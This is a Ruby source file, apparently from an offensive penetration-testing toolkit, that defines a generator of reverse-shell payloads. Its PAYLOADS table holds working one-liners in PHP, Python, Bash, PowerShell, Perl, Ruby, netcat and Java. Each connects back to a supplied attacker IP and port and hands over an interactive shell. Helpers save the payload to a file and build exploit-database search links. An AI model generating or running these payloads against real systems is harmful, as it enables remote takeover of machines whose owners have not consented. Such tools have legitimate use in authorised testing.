require 'uri'
require_relative '../utils/colorize'

class Exploits
  PAYLOADS = {
    php: lambda { |ip, port| "<?php system(\"bash -c 'bash -i >& /dev/tcp/#{ip}/#{port} 0>&1'\"); ?>" },
    python: lambda { |ip, port| "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ip}\",#{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" },
    bash: lambda { |ip, port| "bash -i >& /dev/tcp/#{ip}/#{port} 0>&1" },
    powershell: lambda { |ip, port| "$client = New-Object System.Net.Sockets.TCPClient('#{ip}',#{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" },
    perl: lambda { |ip, port| "perl -e 'use Socket;$i=\"#{ip}\";$p=#{port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" },
    ruby: lambda { |ip, port| "ruby -rsocket -e'f=TCPSocket.open(\"#{ip}\",#{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" },
    nc: lambda { |ip, port| "nc -e /bin/sh #{ip} #{port}" },
    java: lambda { |ip, port| "r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/#{ip}/#{port};cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[]); p.waitFor()" }
  }

  def self.generate_payload(type, ip, port)
    generator = PAYLOADS[type.to_sym]
    return nil unless generator
    generator.call(ip, port)
  end

  def self.save_payload(payload, filename = nil)
    filename ||= "payload_#{Time.now.to_i}.txt"
    File.write(filename, payload)
    filename
  end

  def self.search_exploits(software)
    {
      exploit_db: "https://www.exploit-db.com/search?q=#{URI.encode_www_form_component(software)}",
      cve_details: "https://www.cvedetails.com/vulnerability-list/vendor_id-0/product_id-0/#{URI.encode_www_form_component(software)}",
      packet_storm: "https://packetstormsecurity.com/search/?q=#{URI.encode_www_form_component(software)}"
    }
  end
end

